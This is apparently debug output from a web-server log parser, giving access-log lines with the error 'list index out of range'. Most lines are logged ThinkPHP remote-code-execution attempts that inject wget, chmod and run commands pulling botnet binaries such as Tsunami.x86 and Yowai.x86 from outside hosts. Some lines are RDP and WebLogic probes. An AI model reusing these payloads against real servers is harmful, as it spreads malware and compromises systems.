('124.140.76.80 - - [23/Jan/2019:17:04:32 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('221.125.253.128 - - [23/Jan/2019:17:30:18 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('42.118.227.227 - - [23/Jan/2019:18:01:22 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('122.196.231.141 - - [23/Jan/2019:18:12:30 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('66.160.178.90 - - [23/Jan/2019:19:06:38 +0330] "w\\x12\\xC4\\xD1\\x83\\x07\\x84\\x14dJ4\\x8D\\xDBym\\xADY\\xD3\\x85\\x13\\xB1tx\\xFD\\xC4\\x0F=\\xBD\'xA\\x91b\\x8A\\xAB\\x12\\xC1lta\\x7Ft%\\xB9\\xC8\\xDF\\xCA\\xA7\\xEE\\x80\\xFE\\x0Cc\\x0F\\x8Ey!\\x9F\\x09\\xC9\\x1A\\x92\\xD1\\xDF\\xDC\\xE8>\\x16wf\'\\xA6" 400 166 "-" "-" "-"\n', 'list index out of range')
('49.241.214.70 - - [23/Jan/2019:19:07:13 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('31.162.242.70 - - [23/Jan/2019:19:07:48 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('178.46.9.201 - - [23/Jan/2019:19:17:14 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('99.100.6.45 - - [23/Jan/2019:19:24:13 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('117.192.231.96 - - [23/Jan/2019:19:31:11 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('41.235.182.3 - - [23/Jan/2019:20:15:15 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('41.235.182.3 - - [23/Jan/2019:20:15:16 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('121.84.86.234 - - [23/Jan/2019:20:22:42 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('116.65.89.179 - - [23/Jan/2019:20:31:41 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('193.250.60.181 - - [23/Jan/2019:20:37:55 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.114/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('188.18.193.169 - - [23/Jan/2019:20:49:41 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('185.222.211.18 - - [23/Jan/2019:21:01:08 +0330] "\\x03\\x00\\x00/*\\xE0\\x00\\x00\\x00\\x00\\x00Cookie: mstshash=Administr" 400 166 "-" "-" "-"\n', 'list index out of range')
('94.50.236.10 - - [23/Jan/2019:21:25:58 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('89.46.222.181 - - [23/Jan/2019:21:26:22 +0330] "GET public/index.php?s=/index/\\x5Cthink\\x5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://178.62.46.134/tom/Scorpion.x86;cat%20Scorpion.x86%20>%execute;chmod%20777%execute;./execute%20thinkphp" 400 166 "-" "-" "-"\n', 'list index out of range')
('89.46.222.181 - - [23/Jan/2019:21:26:23 +0330] "GET public/index.php?s=/index/\\x5Cthink\\x5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://178.62.46.134/tom/Scorpion.x86;cat%20Scorpion.x86%20>%execute;chmod%20777%execute;./execute%20thinkphp" 400 166 "-" "-" "-"\n', 'list index out of range')
('72.52.125.79 - - [23/Jan/2019:21:31:31 +0330] "nKB*=w\\xF4\\x0C\\xB5\\x189\\x9D\\xB0<K\\x9B\\xBA\\x82\\x0EP\\xFDp\\x060?\\xCA\\x93\\xA2\\xDF\\xA7D\\x06\\xED\\x1C\\x9Eb\\xC7G\\xCBYq\\x10\\x02\\xAC\\x1C\\xEE\\xDA1Ot\\xA5\\xF0b$\\x05\\xE1\\xFA\\xB7\\xA8\\xB9 5\\xBB0\\xD3}!\\xDD<\\x99\\xD7\\x1C\\xD5\\x04\\x03\\xF2\\x80)\\x99\\x80\\xD8\\x0B\\xF0\\x93\\x95\\x8D\\x0B\\xD2\\x06\\x9E\\xFC\\x19j\\xB3\\x8F\\x0B\\x99\\xDA\\x15\\xB2g\\xE07Z\\x9F\\x9E\\xE0\\x8B\\xD8\\x9CT_a\\xCA\\xDD\\xD4\\x13\\x9F\\xE1\\xDE\\x98\\xA1\\x88K>\\x7F\\x17!_.\\xDA\\xE4\\x0F\\x15+<7\\x03\\x04c#\\xF0\\xF3$\\x8ENa\\x09\\xC9\\x1F7B\\x12\\xE5\\xDF\\xDC\\xB64\\x1D\\xE7\\xBE\\xAD\\xDF8\\xFA\\x92\\xE7\\xE9\\x16\\xA3\\xA0\\xC9\\x98b\\x9B\\x07\\xFB\\x98G\\xD8\\x8D`\\x16\\xDDU\\xBE\\x8E\\x86\\xE9\\x96\\xE8\\xD6\\x1E\\xE2v\\x1C\\xF1\\x1Fy" 400 166 "-" "-" "-"\n', 'list index out of range')
('94.23.156.20 - - [23/Jan/2019:21:37:36 +0330] "" 400 0 "-" "-" "-"\n', 'list index out of range')
('47.39.229.74 - - [23/Jan/2019:21:38:12 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('202.214.186.65 - - [23/Jan/2019:21:45:24 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('85.105.7.73 - - [23/Jan/2019:22:00:08 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('144.132.10.218 - - [23/Jan/2019:22:04:25 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.114/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('64.62.197.31 - - [23/Jan/2019:22:43:20 +0330] "\\x00;\\x01\\x02\\x00\\x01\\x00\\x01\\xFC\\x03\\x03\\xC3/\\xFF\\x83\\xD4o\\x8EA\\xA2\\x91w\\xEC\\x94\\xFDV\\xF9\\xBCm\\xDDm\\xF5\\xD5\\x04\\x9D\\x94\\x9A\\xA4\\x8A\\x05]\\x0C\\xEF \\xCD\\xE1\\x92\\xBD\\x86J\\x92[\\x89" 400 166 "-" "-" "-"\n', 'list index out of range')
('94.51.18.239 - - [23/Jan/2019:23:30:23 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('60.62.222.177 - - [23/Jan/2019:23:45:56 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('190.98.36.106 - - [23/Jan/2019:23:49:13 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('49.241.214.70 - - [23/Jan/2019:23:50:59 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('120.75.116.136 - - [24/Jan/2019:00:26:50 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('102.165.52.19 - - [24/Jan/2019:01:21:49 +0330] "\\x16\\x03\\x01\\x00^\\x01\\x00\\x00Z\\x03\\x01\\x5CG\\xF4" 400 166 "-" "-" "-"\n', 'list index out of range')
('102.165.52.19 - - [24/Jan/2019:01:21:49 +0330] "\\x16\\x03\\x01\\x00^\\x01\\x00\\x00Z\\x03\\x01\\x5CG\\xF4" 400 166 "-" "-" "-"\n', 'list index out of range')
('103.36.79.7 - - [24/Jan/2019:01:53:34 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('103.36.79.7 - - [24/Jan/2019:01:53:36 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('42.115.193.34 - - [24/Jan/2019:01:58:15 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('31.13.243.49 - - [24/Jan/2019:02:59:31 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('77.22.111.96 - - [24/Jan/2019:03:40:19 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.114/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('98.1.80.42 - - [24/Jan/2019:03:57:46 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('86.229.20.79 - - [24/Jan/2019:04:10:34 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.114/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('58.187.64.58 - - [24/Jan/2019:04:13:15 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('68.183.90.135 - - [24/Jan/2019:06:01:31 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://108.61.86.94/bins/Solstice.x86 -O /tmp/.Solstice; chmod 777 /tmp/.Solstice; /tmp/.Solstice Solstice.x86\' HTTP/1.1" 400 166 "-" "Solstice/2.0" "-"\n', 'list index out of range')
('64.68.229.6 - - [24/Jan/2019:06:07:28 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('123.120.173.71 - - [24/Jan/2019:06:48:57 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.114/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('34.221.219.207 - - [24/Jan/2019:06:57:45 +0330] "t3 9.2.0.0" 400 166 "-" "-" "-"\n', 'list index out of range')
('221.202.76.248 - - [24/Jan/2019:06:57:48 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('183.80.89.73 - - [24/Jan/2019:07:22:28 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=\'wget http://185.244.25.139/bins/Tsunami.x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('42.112.104.192 - - [24/Jan/2019:07:37:07 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=\'wget http://185.244.25.139/bins/Tsunami.x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('179.95.230.55 - - [24/Jan/2019:07:37:38 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=\'wget http://207.154.193.227/bins/Tsunami.x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('183.80.89.8 - - [24/Jan/2019:07:54:24 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('80.230.194.29 - - [24/Jan/2019:08:22:41 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=\'wget http://207.154.193.227/bins/Tsunami.x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('89.90.163.13 - - [24/Jan/2019:08:46:41 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.114/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('197.35.81.102 - - [24/Jan/2019:09:59:46 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('74.82.4.78 - - [24/Jan/2019:10:36:55 +0330] " r4---sn-a5msen7s.googlevideo.com.com\\x01\\xBB\\x0Ch\\xBFy\\xE3K.\\xB1\\x14\\x0B\\xBD\\xC2TS\\x91\\xDC\\x0FKh\\x9E\\xF6\\xC5];\\x88\\x0F\\x13\\xBD\\xC5\\xD6\\xF2\\xAE\\x14\\xC5Ks\\xA9\\xFE<5\\xC2\\x005\\x00" 400 166 "-" "-" "-"\n', 'list index out of range')
('74.82.4.78 - - [24/Jan/2019:10:41:34 +0330] "\\x10\\x7F\\x91Q\\xE3\\x8E\\x5C\\xE7\\xF4>\\xB3&{o\\xB9F/~P\\xD3B?\\x91\\xA9\\xD2\\x86\\xF7fB\\xB4FE\\xF9\\xE4U\\x1B`\\x1F\\x16\\xB4)" 400 166 "-" "-" "-"\n', 'list index out of range')
('72.52.87.84 - - [24/Jan/2019:10:51:17 +0330] "\\x04\\xB7\\x14(\\x8D\\x17\\xC7fR\\x95\\xE9.R\\xAF62\\xBD7\\x19\\x89\\xD3\\x02\\xA4\\xFD\\x9D^F\\xD0\\xD2P\\xEFF\\x89\\xBE\\xCA\\xE6\\xD2\\x9E%,\\x09\\xE2\\x02x\\xB2\\xFF\\xFA\\x92`\\xBA\\x16\\x93\\x80\\x04\\xC4D\\xD4\\xE1\\x8Cz\\xE0\\x06\\xC0" 400 166 "-" "-" "-"\n', 'list index out of range')
('52.53.248.70 - - [24/Jan/2019:11:26:18 +0330] "t3 9.2.0.0" 400 166 "-" "-" "-"\n', 'list index out of range')
('193.250.60.181 - - [24/Jan/2019:11:43:43 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.114/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('43.230.197.4 - - [24/Jan/2019:12:27:46 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('180.145.23.14 - - [24/Jan/2019:12:43:45 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('64.71.174.32 - - [24/Jan/2019:12:43:55 +0330] "E\\x00\\x003\\xAA1@\\x00@\\x11\\xA6N" 400 166 "-" "-" "-"\n', 'list index out of range')
('64.71.174.32 - - [24/Jan/2019:12:43:59 +0330] "\\x17\\x03\\x03\\x01\\xBB\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x1F\\x8A\\x03\\x9F" 400 166 "-" "-" "-"\n', 'list index out of range')
('114.243.174.202 - - [24/Jan/2019:12:53:21 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=\'wget http://207.154.193.227/bins/Tsunami.x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('5.78.190.233 - - [24/Jan/2019:13:08:04 +0330] "GET /rapidGrails/jsonList?maxColumns=10&domainClass=eshop.AuditLog&filter=[{op:and,data:[{op:%27isNotNull%27,%20field:%27actor%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27actor%27,%20val:%27system%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:or,data:[{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Product%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Product%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27persistedObjectId%27,%20val:31183},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27propertyName%27,%20val:%27isSynchronized%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27propertyName%27,%20val:%27visitCount%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Variation%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Variation%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[70942,%2070943,%2070944,%2074910,%2074911]}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.ProductModel%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27ProductModel%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[61071,%2061072]}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Price%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Price%27}]}